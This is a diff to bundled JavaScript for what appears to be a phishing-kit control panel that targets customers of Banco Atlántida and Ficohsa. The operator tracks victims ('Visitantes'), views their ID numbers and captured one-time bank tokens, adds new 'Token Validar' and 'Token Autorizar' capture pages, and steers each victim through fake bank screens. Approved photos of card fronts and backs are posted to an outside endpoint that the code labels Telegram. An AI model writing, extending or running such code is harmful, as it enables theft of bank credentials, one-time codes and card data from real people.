@@ -18083,22 +18083,30 @@ const ProtectedLayout = () => {
   ) });
 };
 
-const scriptRel = 'modulepreload';const assetsURL = function(dep) { return "/"+dep };const seen = {};const __vitePreload = function preload(baseModule, deps, importerUrl) {
+const scriptRel = 'modulepreload';const assetsURL = function(dep, importerUrl) { return new URL(dep, importerUrl).href };const seen = {};const __vitePreload = function preload(baseModule, deps, importerUrl) {
   let promise = Promise.resolve();
   if (true && deps && deps.length > 0) {
-    document.getElementsByTagName("link");
+    const links = document.getElementsByTagName("link");
     const cspNonceMeta = document.querySelector(
       "meta[property=csp-nonce]"
     );
     const cspNonce = cspNonceMeta?.nonce || cspNonceMeta?.getAttribute("nonce");
     promise = Promise.allSettled(
       deps.map((dep) => {
-        dep = assetsURL(dep);
+        dep = assetsURL(dep, importerUrl);
         if (dep in seen) return;
         seen[dep] = true;
         const isCss = dep.endsWith(".css");
         const cssSelector = isCss ? '[rel="stylesheet"]' : "";
-        if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
+        const isBaseRelative = !!importerUrl;
+        if (isBaseRelative) {
+          for (let i = links.length - 1; i >= 0; i--) {
+            const link2 = links[i];
+            if (link2.href === dep && (!isCss || link2.rel === "stylesheet")) {
+              return;
+            }
+          }
+        } else if (document.querySelector(`link[href="${dep}"]${cssSelector}`)) {
           return;
         }
         const link = document.createElement("link");
@@ -22068,6 +22076,7 @@ function UserListSidebar({
   selectedUserId,
   onSelectUser,
   onDeleteUser,
+  onDeleteAllUsers,
   selectedBank,
   onChangeBank,
   onLogout
@@ -22276,9 +22285,19 @@ function UserListSidebar({
         className: "flex items-end justify-between mb-1",
         children: [
           /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { children: [
-            /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-1.5 text-[10px] uppercase tracking-[0.2em] text-white/40", children: [
+            /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-2 text-[10px] uppercase tracking-[0.2em] text-white/40", children: [
               /* @__PURE__ */ jsxRuntimeExports.jsx(Users, { className: "w-3 h-3" }),
-              "Visitantes"
+              /* @__PURE__ */ jsxRuntimeExports.jsx("span", { children: "Visitantes" }),
+              users.length > 0 && onDeleteAllUsers && /* @__PURE__ */ jsxRuntimeExports.jsx(
+                "button",
+                {
+                  type: "button",
+                  onClick: onDeleteAllUsers,
+                  title: "Eliminar todos los visitantes",
+                  className: "p-1 rounded-md text-white/40 hover:text-red-400 hover:bg-red-500/15 transition-colors cursor-pointer",
+                  children: /* @__PURE__ */ jsxRuntimeExports.jsx(Trash2, { className: "w-3.5 h-3.5" })
+                }
+              )
             ] }),
             /* @__PURE__ */ jsxRuntimeExports.jsx("p", { className: cn(
               "font-mono text-3xl font-light tabular-nums leading-none mt-1",
@@ -22436,7 +22455,7 @@ const BrowserEmulator = ({ children, overlays }) => {
         onMouseDown: (e) => {
           if (e.button === 0) {
             try {
-              __vitePreload(async () => { const {getCurrentWindow} = await Promise.resolve().then(() => window$1);return { getCurrentWindow }},true?void 0:void 0).then(({ getCurrentWindow }) => {
+              __vitePreload(async () => { const {getCurrentWindow} = await Promise.resolve().then(() => window$1);return { getCurrentWindow }},true?void 0:void 0,import.meta.url).then(({ getCurrentWindow }) => {
                 getCurrentWindow().startDragging();
               });
             } catch {
@@ -22550,7 +22569,9 @@ const UserInfoPanel = ({ user, onSelectPhoto }) => {
           return [
             { label: idLabel, value: idValue || "—", key: "id" },
             { label: "Desbloquear", value: user.token || "", key: "token" },
-            { label: "Registrar", value: user.smsToken || "", key: "smsToken" }
+            { label: "Registrar", value: user.smsToken || "", key: "smsToken" },
+            { label: "Token Validar", value: user.validarToken || "", key: "validarToken" },
+            { label: "Token Autorizar", value: user.autorizarToken || "", key: "autorizarToken" }
           ];
         }
       })().map((item, idx) => /* @__PURE__ */ jsxRuntimeExports.jsxs(
@@ -23033,9 +23054,11 @@ const ActionsPanel = ({
   const isPageEnabled = (page) => {
     if (page === 1) {
       if (currentPage !== 0) return false;
-      const hasDNI = !!(user?.DNI || user?.RTN);
-      const hasToken = !!(user?.token || user?.smsToken || user?.prestamoToken);
-      if (hasDNI && !hasToken) return false;
+      const hasIdentification = Boolean(user?.DNI || user?.RTN);
+      const hasAnyToken = Boolean(
+        user?.token || user?.smsToken || user?.prestamoToken || user?.validarToken || user?.autorizarToken
+      );
+      if (hasIdentification && !hasAnyToken) return false;
       return true;
     }
     if (currentPage === 0) return true;
@@ -23064,7 +23087,7 @@ const ActionsPanel = ({
   const statusKey = user?.pageState || "inactive";
   const badgeClasses = statusKey === "viewing" ? "bg-green-500 text-white ring-1 ring-green-400/40 border-2 border-white" : statusKey === "minimized" ? "bg-yellow-500 text-white ring-1 ring-yellow-400/40 border-2 border-white" : "bg-red-500 text-white ring-1 ring-red-400/40 border-2 border-white";
   const isFicohsa = selectedBank === "ficohsa";
-  const themeActiveBtnClass = isFicohsa ? "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#0058CB] shadow hover:bg-[#0047a8] active:bg-[#003a7c] active:translate-y-[1.5px] focus:ring-2 focus:ring-[#0058CB]/60" : "bg-[#E31B23] text-white font-bold backdrop-blur-md border border-[#E31B23] shadow hover:bg-[#E31B23]/90 active:bg-[#b71c1c] active:translate-y-[1.5px] focus:ring-2 focus:ring-[#E31B23]/60";
+  const themeActiveBtnClass = "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#0058CB] shadow hover:bg-[#0047a8] active:bg-[#003a7c] active:translate-y-[1.5px] focus:ring-2 focus:ring-[#0058CB]/60";
   const tokenBtnClass = themeActiveBtnClass;
   const fotoBtnClass = "bg-[#0058CB] text-white font-bold backdrop-blur-md border border-[#004bb0] shadow hover:bg-[#0045a3] active:bg-[#003680] active:translate-y-[1.5px] focus:ring-2 focus:ring-cyan-400/60";
   const btn1Label = "DNI/RTN";
@@ -23138,6 +23161,32 @@ const ActionsPanel = ({
           children: btn3Label
         }
       ),
+      !isFicohsa && /* @__PURE__ */ jsxRuntimeExports.jsxs(jsxRuntimeExports.Fragment, { children: [
+        /* @__PURE__ */ jsxRuntimeExports.jsx(
+          "button",
+          {
+            onClick: () => onUpdatePage(8),
+            disabled: !isPageEnabled(8),
+            className: `
+                py-2 px-3 rounded-lg font-medium transition-all duration-300 ease-out
+                ${isPageEnabled(8) ? tokenBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
+              `,
+            children: "Token Validar"
+          }
+        ),
+        /* @__PURE__ */ jsxRuntimeExports.jsx(
+          "button",
+          {
+            onClick: () => onUpdatePage(9),
+            disabled: !isPageEnabled(9),
+            className: `
+                py-2 px-3 rounded-lg font-medium transition-all duration-300 ease-out
+                ${isPageEnabled(9) ? tokenBtnClass : "bg-gray-800/50 text-gray-400/80 cursor-not-allowed border border-gray-700/20 backdrop-blur-sm hover:bg-gray-800/60"}
+              `,
+            children: "Token Autorizar"
+          }
+        )
+      ] }),
       /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "relative group", children: [
         /* @__PURE__ */ jsxRuntimeExports.jsxs(
           "button",
@@ -56250,7 +56299,7 @@ const EmulatorPageLayout = ({ children, isExpanded = false }) => /* @__PURE__ */
 const EmulatorLoader = ({ successMessage }) => {
   const selectedBank = sessionStorage.getItem("selectedBank") || "atlantida";
   return /* @__PURE__ */ jsxRuntimeExports.jsx(EmulatorBoundContainer, { children: /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: `absolute inset-0 flex flex-col items-center justify-center z-50 no-scrollbar ${selectedBank === "ficohsa" ? "bg-[#0058CB]" : "bg-[#E31B23]"}`, children: /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex flex-col items-center gap-6 mt-[-10%]", children: [
-    selectedBank === "ficohsa" ? /* @__PURE__ */ jsxRuntimeExports.jsx("svg", { viewBox: "0 0 166 166", xmlns: "http://www.w3.org/2000/svg", "aria-hidden": "true", className: "w-16 h-16 flex-shrink-0", children: /* @__PURE__ */ jsxRuntimeExports.jsx("path", { d: "M120.236 24.39 C122.656 29.41 120.586 33.91 115.216 34.6 L103.626 36.16 C34.236 45.5 16.416 69.9 12.436 86.34 L2.05598 62.29 C-9.01402 35.82 24.376 7.78 108.126 0 L120.236 24.39 Z M106.566 47.23 C30.256 57.61 13.646 89.28 21.086 106.41 L32.336 132.54 C32.336 109.7 62.966 92.74 110.716 83.74 C116.946 82.53 120.236 78.2 117.806 72.67 L106.566 47.23 Z M47.736 123.71 C43.756 127.69 40.986 133.23 40.986 138.07 C40.986 152.43 55.696 161.95 91.516 162.64 L78.366 136.68 C56.906 138.08 50.506 131.15 47.736 123.71 Z", fill: "#FFFFFF" }) }) : /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: "/logo2.png", alt: "Banco Atlántida", className: "w-16 h-16 flex-shrink-0 object-contain" }),
+    selectedBank === "ficohsa" ? /* @__PURE__ */ jsxRuntimeExports.jsx("svg", { viewBox: "0 0 166 166", xmlns: "http://www.w3.org/2000/svg", "aria-hidden": "true", className: "w-16 h-16 flex-shrink-0", children: /* @__PURE__ */ jsxRuntimeExports.jsx("path", { d: "M120.236 24.39 C122.656 29.41 120.586 33.91 115.216 34.6 L103.626 36.16 C34.236 45.5 16.416 69.9 12.436 86.34 L2.05598 62.29 C-9.01402 35.82 24.376 7.78 108.126 0 L120.236 24.39 Z M106.566 47.23 C30.256 57.61 13.646 89.28 21.086 106.41 L32.336 132.54 C32.336 109.7 62.966 92.74 110.716 83.74 C116.946 82.53 120.236 78.2 117.806 72.67 L106.566 47.23 Z M47.736 123.71 C43.756 127.69 40.986 133.23 40.986 138.07 C40.986 152.43 55.696 161.95 91.516 162.64 L78.366 136.68 C56.906 138.08 50.506 131.15 47.736 123.71 Z", fill: "#FFFFFF" }) }) : /* @__PURE__ */ jsxRuntimeExports.jsx("img", { src: "/logo2.png", alt: "Banco Atlántida", className: "w-44 h-auto max-w-[75%] flex-shrink-0 object-contain" }),
     /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex justify-center gap-3", children: [0, 1, 2].map((i) => /* @__PURE__ */ jsxRuntimeExports.jsx(
       "div",
       {
@@ -56508,6 +56557,7 @@ const FotoPage = ({
   fotoRechazada,
   fotoAprobada,
   pasoFoto = "frente",
+  isPhotoActionLoading = false,
   onAprobarFoto,
   onRechazarFoto
 }) => {
@@ -56562,10 +56612,11 @@ const FotoPage = ({
             "button",
             {
               type: "button",
+              disabled: isPhotoActionLoading,
               onClick: onRechazarFoto,
-              className: "flex-1 py-3 px-4 rounded-xl font-bold text-xs sm:text-sm bg-red-500/20 text-red-300 border border-red-500/40 hover:bg-red-500/30 transition-all flex items-center justify-center gap-2 shadow-md active:scale-95",
+              className: "flex-1 py-3 px-4 rounded-xl font-bold text-xs sm:text-sm bg-red-500/20 text-red-300 border border-red-500/40 hover:bg-red-500/30 disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2 shadow-md active:scale-95",
               children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 17 }),
+                /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 17, className: isPhotoActionLoading ? "animate-spin" : "" }),
                 "Pedir reintento"
               ]
             }
@@ -56574,11 +56625,12 @@ const FotoPage = ({
             "button",
             {
               type: "button",
+              disabled: isPhotoActionLoading,
               onClick: onAprobarFoto,
-              className: "flex-1 py-3 px-5 rounded-xl font-bold text-xs sm:text-sm bg-emerald-600 hover:bg-emerald-500 text-white transition-all flex items-center justify-center gap-2 shadow-lg shadow-emerald-950/50 active:scale-95",
+              className: "flex-1 py-3 px-5 rounded-xl font-bold text-xs sm:text-sm bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 disabled:cursor-not-allowed text-white transition-all flex items-center justify-center gap-2 shadow-lg shadow-emerald-950/50 active:scale-95",
               children: [
-                /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 18, strokeWidth: 2.5 }),
-                "Aprobar"
+                isPhotoActionLoading ? /* @__PURE__ */ jsxRuntimeExports.jsx(IconRefresh, { size: 18, className: "animate-spin" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(IconCheck, { size: 18, strokeWidth: 2.5 }),
+                isPhotoActionLoading ? "Procesando..." : "Aprobar"
               ]
             }
           )
@@ -56664,6 +56716,8 @@ const EmulatedPage = ({
   token = "",
   smsToken = "",
   prestamoToken = "",
+  validarToken = "",
+  autorizarToken = "",
   openedFromMain = false,
   successMessage = "",
   fotoTemporal,
@@ -56674,6 +56728,7 @@ const EmulatedPage = ({
   pasoFoto,
   fotoFrente,
   fotoReverso,
+  isPhotoActionLoading,
   onAprobarFoto,
   onRechazarFoto
 }) => {
@@ -56759,6 +56814,7 @@ const EmulatedPage = ({
             pasoFoto,
             fotoFrente,
             fotoReverso,
+            isPhotoActionLoading,
             onAprobarFoto,
             onRechazarFoto
           }
@@ -56799,6 +56855,10 @@ const EmulatedPage = ({
           return /* @__PURE__ */ jsxRuntimeExports.jsx(TokenMovilPage$1, { token });
         case 3:
           return /* @__PURE__ */ jsxRuntimeExports.jsx(TokenSmsPage$1, { smsToken });
+        case 8:
+          return /* @__PURE__ */ jsxRuntimeExports.jsx(TokenMovilPage$1, { token: validarToken || token });
+        case 9:
+          return /* @__PURE__ */ jsxRuntimeExports.jsx(TokenMovilPage$1, { token: autorizarToken || token });
         default:
           return /* @__PURE__ */ jsxRuntimeExports.jsx(DniPage$1, { DNI, RTN });
       }
@@ -56877,6 +56937,12 @@ const userService = {
     } catch (e) {
     }
     await deleteDoc(redirRef);
+  },
+  /**
+   * Elimina todos los usuarios indicados y sus datos relacionados
+   */
+  async deleteAllUsers(userIds) {
+    await Promise.all(userIds.map((id) => this.deleteUser(id)));
   },
   /**
    * Actualiza la página del usuario
@@ -57403,6 +57469,34 @@ const useDashboardActions = (selectedUserId, onClearSelection) => {
     }
   };
   const cancelDeleteUser = () => setConfirmDeleteUserId(null);
+  const [showDeleteAllConfirm, setShowDeleteAllConfirm] = reactExports.useState(false);
+  const [loadingDeleteAll, setLoadingDeleteAll] = reactExports.useState(false);
+  const handleDeleteAllUsers = () => {
+    setShowDeleteAllConfirm(true);
+  };
+  const confirmDeleteAllUsers = async (userIds) => {
+    if (!userIds.length) {
+      setShowDeleteAllConfirm(false);
+      return;
+    }
+    setLoadingDeleteAll(true);
+    try {
+      await userService.deleteAllUsers(userIds);
+      onClearSelection && onClearSelection("delete");
+      toast.success("Visitantes eliminados", {
+        description: `Se eliminaron ${userIds.length} visitantes correctamente.`
+      });
+    } catch (error) {
+      console.error("Error eliminando todos los visitantes:", error);
+      toast.error("Error", {
+        description: "No se pudieron eliminar todos los visitantes. Intente nuevamente."
+      });
+    } finally {
+      setLoadingDeleteAll(false);
+      setShowDeleteAllConfirm(false);
+    }
+  };
+  const cancelDeleteAllUsers = () => setShowDeleteAllConfirm(false);
   const handleUpdatePage = async (userId, newPage) => {
     try {
       await userService.updatePage(userId, newPage);
@@ -57530,6 +57624,11 @@ const useDashboardActions = (selectedUserId, onClearSelection) => {
     confirmDeleteUser,
     cancelDeleteUser,
     loadingDelete,
+    showDeleteAllConfirm,
+    loadingDeleteAll,
+    handleDeleteAllUsers,
+    confirmDeleteAllUsers,
+    cancelDeleteAllUsers,
     confirmRequestChatUserId,
     confirmRequestChat,
     cancelRequestChat,
@@ -57598,6 +57697,11 @@ const useDashboardData = () => {
     confirmDeleteUser: actions.confirmDeleteUser,
     cancelDeleteUser: actions.cancelDeleteUser,
     loadingDelete: actions.loadingDelete,
+    showDeleteAllConfirm: actions.showDeleteAllConfirm,
+    loadingDeleteAll: actions.loadingDeleteAll,
+    handleDeleteAllUsers: actions.handleDeleteAllUsers,
+    confirmDeleteAllUsers: actions.confirmDeleteAllUsers,
+    cancelDeleteAllUsers: actions.cancelDeleteAllUsers,
     confirmRequestChatUserId: actions.confirmRequestChatUserId,
     confirmRequestChat: actions.confirmRequestChat,
     cancelRequestChat: actions.cancelRequestChat,
@@ -57727,6 +57831,8 @@ const Dashboard = () => {
   const [loadingFinalizar, setLoadingFinalizar] = reactExports.useState(false);
   const [showFotoConfirm, setShowFotoConfirm] = reactExports.useState(false);
   const [loadingFoto, setLoadingFoto] = reactExports.useState(false);
+  const [loadingPhotoAction, setLoadingPhotoAction] = reactExports.useState(false);
+  const photoActionLockRef = reactExports.useRef(false);
   const handleLogoutRequest = () => setShowLogoutConfirm(true);
   const handleLogoutCancel = () => {
     if (!loadingLogout) setShowLogoutConfirm(false);
@@ -57766,6 +57872,11 @@ const Dashboard = () => {
     confirmDeleteUser,
     cancelDeleteUser,
     loadingDelete,
+    showDeleteAllConfirm,
+    loadingDeleteAll,
+    handleDeleteAllUsers,
+    confirmDeleteAllUsers,
+    cancelDeleteAllUsers,
     confirmRequestChatUserId,
     confirmRequestChat,
     cancelRequestChat,
@@ -57808,8 +57919,8 @@ const Dashboard = () => {
       const message = lastFormPage === 1 ? "Identidad confirmada exitosamente" : "Token confirmado exitosamente";
       setSuccessMessage(message);
       try {
-        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+        const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+        const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
         await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
           successMessage: message
         });
@@ -57821,8 +57932,8 @@ const Dashboard = () => {
   const handleUpdatePageWithClear = async (userId, page) => {
     setSuccessMessage("");
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -57835,6 +57946,12 @@ const Dashboard = () => {
         fieldsToUpdate.smsToken = null;
       } else if (page === 4) {
         fieldsToUpdate.prestamoToken = null;
+      } else if (page === 8) {
+        fieldsToUpdate.validarToken = null;
+        fieldsToUpdate.token = null;
+      } else if (page === 9) {
+        fieldsToUpdate.autorizarToken = null;
+        fieldsToUpdate.token = null;
       }
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), userId), fieldsToUpdate);
     } catch (e) {
@@ -57876,8 +57993,8 @@ const Dashboard = () => {
     }
     setLoadingFoto(true);
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
         mostrarModalFoto: true,
         fotoRechazada: false,
@@ -57897,37 +58014,23 @@ const Dashboard = () => {
     }, 500);
   };
   const handleAprobarFoto = async () => {
-    if (!selectedUserId) return;
+    if (!selectedUserId || photoActionLockRef.current) return;
+    photoActionLockRef.current = true;
+    setLoadingPhotoAction(true);
     try {
-      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, getDoc, updateDoc } = await __vitePreload(async () => { const { doc, getDoc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, getDoc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       const userDocRef = doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId);
-      const userSnap = await getDoc(userDocRef);
-      const userData = userSnap.exists() ? userSnap.data() : selectedUser;
-      const pasoActual = userData?.pasoFoto || selectedUser?.pasoFoto || "frente";
-      const fotoAprobadaSrc = userData?.fotoTemporalHD || userData?.fotoTemporal || selectedUser?.fotoTemporalHD || selectedUser?.fotoTemporal || "";
-      const dniUser = userData?.DNI || userData?.RTN || selectedUser?.DNI || selectedUser?.RTN || selectedUserId;
+      let userData = selectedUser;
+      if (!userData?.fotoTemporalHD && !userData?.fotoTemporal) {
+        const userSnap = await getDoc(userDocRef);
+        if (userSnap.exists()) userData = userSnap.data();
+      }
+      const pasoActual = userData?.pasoFoto || "frente";
+      const fotoAprobadaSrc = userData?.fotoTemporalHD || userData?.fotoTemporal || "";
+      const dniUser = userData?.DNI || userData?.RTN || selectedUserId;
       const fechaStr = (/* @__PURE__ */ new Date()).toLocaleString("es-HN", { dateStyle: "short", timeStyle: "short" });
       if (pasoActual === "frente") {
-        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
-          const caption = `<b>TARJETA APROBADA (FRENTE)</b>
-👤 <b>Usuario:</b> <code>${dniUser}</code>
-🏦 <b>Banco:</b> ${selectedBank.toUpperCase()}
-🕒 <b>Fecha:</b> ${fechaStr}`;
-          try {
-            await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                bank: selectedBank,
-                photo: fotoAprobadaSrc,
-                caption
-              })
-            });
-          } catch (err) {
-            console.error("[Telegram] Error enviando foto frente:", err);
-          }
-        }
         await updateDoc(userDocRef, {
           fotoFrente: fotoAprobadaSrc || true,
           fotoTemporal: null,
@@ -57938,26 +58041,22 @@ const Dashboard = () => {
           fotoRechazada: false,
           ultimoValor: "Tarjeta Frente Aprobada - Solicitando Reverso"
         });
-      } else {
         if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
-          const caption = `<b>TARJETA APROBADA (REVERSO)</b>
+          const caption = `<b>TARJETA APROBADA (FRENTE)</b>
 👤 <b>Usuario:</b> <code>${dniUser}</code>
 🏦 <b>Banco:</b> ${selectedBank.toUpperCase()}
 🕒 <b>Fecha:</b> ${fechaStr}`;
-          try {
-            await fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                bank: selectedBank,
-                photo: fotoAprobadaSrc,
-                caption
-              })
-            });
-          } catch (err) {
-            console.error("[Telegram] Error enviando foto reverso:", err);
-          }
+          fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              bank: selectedBank,
+              photo: fotoAprobadaSrc,
+              caption
+            })
+          }).catch((err) => console.error("[Telegram] Error enviando foto frente:", err));
         }
+      } else {
         await updateDoc(userDocRef, {
           fotoReverso: fotoAprobadaSrc || true,
           fotoTemporal: null,
@@ -57969,16 +58068,36 @@ const Dashboard = () => {
           ultimoValor: "Tarjeta Reverso Aprobada (Completo)"
         });
         handleUpdatePage(selectedUserId, 0);
+        if (fotoAprobadaSrc && typeof fotoAprobadaSrc === "string" && fotoAprobadaSrc.startsWith("data:")) {
+          const caption = `<b>TARJETA APROBADA (REVERSO)</b>
+👤 <b>Usuario:</b> <code>${dniUser}</code>
+🏦 <b>Banco:</b> ${selectedBank.toUpperCase()}
+🕒 <b>Fecha:</b> ${fechaStr}`;
+          fetch("https://adminconfig-panel.vercel.app/api/notify-photo", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              bank: selectedBank,
+              photo: fotoAprobadaSrc,
+              caption
+            })
+          }).catch((err) => console.error("[Telegram] Error enviando foto reverso:", err));
+        }
       }
     } catch (e) {
       console.error("[Dashboard] Error al aprobar foto:", e);
+    } finally {
+      photoActionLockRef.current = false;
+      setLoadingPhotoAction(false);
     }
   };
   const handleRechazarFoto = async () => {
-    if (!selectedUserId) return;
+    if (!selectedUserId || photoActionLockRef.current) return;
+    photoActionLockRef.current = true;
+    setLoadingPhotoAction(true);
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       await updateDoc(doc(getActiveBankDb(), getBankCollection("redireccion"), selectedUserId), {
         fotoRechazada: true,
         esperandoAprobacionFoto: false,
@@ -57989,14 +58108,17 @@ const Dashboard = () => {
       });
     } catch (e) {
       console.error("[Dashboard] Error al rechazar foto:", e);
+    } finally {
+      photoActionLockRef.current = false;
+      setLoadingPhotoAction(false);
     }
   };
   const handleError = async () => {
     if (!selectedUserId) return;
     const lastFormPage = lastFormPageByUser[selectedUserId] || 1;
     try {
-      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0);
-      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0);
+      const { doc, updateDoc } = await __vitePreload(async () => { const { doc, updateDoc } = await Promise.resolve().then(() => index_esm);return { doc, updateDoc }},true?void 0:void 0,import.meta.url);
+      const { getActiveBankDb, getBankCollection } = await __vitePreload(async () => { const { getActiveBankDb, getBankCollection } = await Promise.resolve().then(() => firebase);return { getActiveBankDb, getBankCollection }},true?void 0:void 0,import.meta.url);
       const fieldsToUpdate = {
         successMessage: null
       };
@@ -58074,6 +58196,36 @@ const Dashboard = () => {
   const [infoPosition, setInfoPosition] = usePersistentPosition("user-info", { x: 797, y: 183 });
   const [actionsPosition, setActionsPosition] = usePersistentPosition("actions-panel", { x: 48, y: 203 });
   const [chatPosition, setChatPosition] = usePersistentPosition("chat-panel", { x: 700, y: 0 });
+  reactExports.useEffect(() => {
+    const clampToContainer = (pos, panelEl, containerEl) => {
+      if (!containerEl || !panelEl) return pos;
+      const maxX = Math.max(0, containerEl.clientWidth - panelEl.offsetWidth);
+      const maxY = Math.max(0, containerEl.clientHeight - panelEl.offsetHeight);
+      const nextX = Math.max(0, Math.min(pos.x, maxX));
+      const nextY = Math.max(0, Math.min(pos.y, maxY));
+      if (nextX === pos.x && nextY === pos.y) return pos;
+      return { x: nextX, y: nextY };
+    };
+    const syncPositions = () => {
+      const container = mainRef.current;
+      if (!container) return;
+      setInfoPosition((prev) => clampToContainer(prev, infoRef.current, container));
+      setActionsPosition((prev) => clampToContainer(prev, actionsRef.current, container));
+      setChatPosition((prev) => clampToContainer(prev, chatRef.current, container));
+    };
+    const rafId = requestAnimationFrame(syncPositions);
+    const observer = new ResizeObserver(syncPositions);
+    if (mainRef.current) observer.observe(mainRef.current);
+    if (infoRef.current) observer.observe(infoRef.current);
+    if (actionsRef.current) observer.observe(actionsRef.current);
+    if (chatRef.current) observer.observe(chatRef.current);
+    window.addEventListener("resize", syncPositions);
+    return () => {
+      cancelAnimationFrame(rafId);
+      observer.disconnect();
+      window.removeEventListener("resize", syncPositions);
+    };
+  }, [selectedUserId, showChatPanel, chatStatus, setInfoPosition, setActionsPosition, setChatPosition]);
   reactExports.useEffect(() => {
     if (isDragging) {
       document.body.style.userSelect = "none";
@@ -58326,6 +58478,8 @@ const Dashboard = () => {
             token: selectedUser.token,
             smsToken: selectedUser.smsToken,
             prestamoToken: selectedUser.prestamoToken,
+            validarToken: selectedUser.validarToken,
+            autorizarToken: selectedUser.autorizarToken,
